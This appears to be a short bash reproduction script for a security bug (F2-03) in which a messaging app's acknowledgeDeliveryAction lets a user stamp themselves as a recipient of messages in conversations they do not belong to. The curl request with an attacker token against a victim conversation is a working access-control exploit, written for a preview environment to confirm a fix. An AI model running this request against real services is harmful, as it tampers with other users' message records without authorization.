#!/usr/bin/env bash
# F2-03 repro — acknowledgeDeliveryAction stamps deliveredTo on foreign messages.
#
# Preconditions (preview env only):
#   PREVIEW_BASE, ATTACKER_TOKEN, VICTIM_CONV_ID, VICTIM_MSG_ID
#
# Run as attacker A against a (B,C) conversation A is not in.
#
# Expected (current behaviour, BUG): the targeted message's deliveredTo array
# now contains A's uid even though A never received it.
#
# Expected (after fix): HTTP 4xx "Not a participant".

set -euo pipefail
: "${PREVIEW_BASE:?}"; : "${ATTACKER_TOKEN:?}"; : "${VICTIM_CONV_ID:?}"; : "${VICTIM_MSG_ID:?}"

curl -sS -X POST "${PREVIEW_BASE}/messages" \
    -H "authorization: Bearer ${ATTACKER_TOKEN}" \
    -H "content-type: text/plain;charset=UTF-8" \
    -H "next-action: <lifted-action-id-for-acknowledgeDeliveryAction>" \
    --data-raw "[\"${VICTIM_CONV_ID}\",[\"${VICTIM_MSG_ID}\"]]" \
    -w "\nstatus: %{http_code}\n"

echo
echo "Inspect conversations/${VICTIM_CONV_ID}/messages/${VICTIM_MSG_ID}.deliveredTo — attacker uid must not be present."
